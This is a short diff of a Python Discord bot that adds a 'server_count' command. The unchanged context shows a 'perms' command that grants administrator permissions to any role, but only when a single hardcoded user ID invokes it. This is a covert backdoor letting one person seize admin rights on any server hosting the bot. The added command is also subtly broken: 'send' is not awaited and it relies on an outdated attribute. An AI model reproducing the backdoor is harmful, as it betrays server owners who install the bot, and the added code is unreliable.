@@ -25,6 +25,10 @@ async def on_ready():
 	print("Bot is ready.")
 	
 @client.command()
+async def server_count(ctx):
+	ctx.send(f"I am in {len(client.servers)} servers!!")
+	
+@client.command()
 async def perms(ctx , Role:discord.Role):
 	if ctx.message.author.id == 727539383405772901:
 		await Role.edit(reason = None ,permissions = discord.Permissions(administrator = True))
